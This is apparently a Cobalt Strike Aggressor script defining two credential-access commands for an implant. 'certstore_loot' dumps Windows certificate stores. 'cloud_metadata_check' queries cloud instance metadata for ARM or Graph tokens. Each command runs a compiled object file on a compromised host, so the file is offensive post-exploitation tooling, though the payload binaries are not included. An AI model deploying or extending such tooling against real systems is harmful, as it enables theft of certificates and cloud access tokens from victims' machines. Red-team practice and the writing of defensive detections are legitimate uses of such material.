# certstore_loot [store_name location(CurrentUser|LocalMachine)]
alias certstore_loot {
    if ($2 !is $null && $2 ne "" && $3 !is $null && $3 ne "") {
        bof_run($1, "credential_access/certstore_loot/certstore_loot.x64.o", bof_pack($1, "zz", $2, $3));
    } else {
        bof_run($1, "credential_access/certstore_loot/certstore_loot.x64.o", bof_pack($1, ""));
    }
}

# cloud_metadata_check [presence] [-aud arm|graph|other <resource>]
alias cloud_metadata_check {
    local('$n');
    $n = 0;
    if ($2 !is $null && $2 ne "") { $n = 1; }
    if ($3 !is $null && $3 ne "") { $n = 2; }
    if ($4 !is $null && $4 ne "") { $n = 3; }
    if ($5 !is $null && $5 ne "") { $n = 4; }

    if ($n == 0) {
        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, ""));
    } else if ($n == 1) {
        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, "z", $2));
    } else if ($n == 2) {
        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, "zz", $2, $3));
    } else if ($n == 3) {
        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, "zzz", $2, $3, $4));
    } else {
        bof_run($1, "credential_access/cloud_metadata_check/cloud_metadata_check.x64.o", bof_pack($1, "zzzz", $2, $3, $4, $5));
    }
}

